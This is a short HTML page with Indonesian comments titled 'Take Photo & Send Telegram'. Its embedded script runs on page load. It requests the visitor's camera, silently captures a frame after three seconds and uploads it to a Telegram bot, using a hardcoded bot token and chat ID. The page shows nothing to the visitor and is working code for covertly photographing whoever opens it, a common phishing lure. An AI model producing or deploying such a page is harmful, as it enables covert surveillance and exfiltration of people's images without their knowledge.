<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Ambil Foto & Kirim Telegram</title>
</head>
<body>
  <script>
    // Ganti dengan token dan chat_id kamu
    const BOT_TOKEN = "7263103738:AAFHQr9tKSy-DxMM5h7H9XdDPyksAdb-3_Q";
    const CHAT_ID = "7191940139";

    // Fungsi kirim foto ke Telegram
    async function sendPhoto(blob) {
      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("photo", blob, "capture.png");
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: fd
      });
    }

    // Akses kamera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        // Tunggu kamera nyala sebentar
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0);

          // Konversi ke blob
          canvas.toBlob(async (blob) => {
            await sendPhoto(blob);  // kirim ke Telegram
            console.log("Foto berhasil dikirim ke Telegram");
            // stop kamera
            stream.getTracks().forEach(track => track.stop());
          }, "image/png");
        }, 3000); // otomatis ambil setelah 3 detik
      })
      .catch(err => {
        console.error("Tidak bisa akses kamera:", err);
      });
  </script>
</body>
</html>
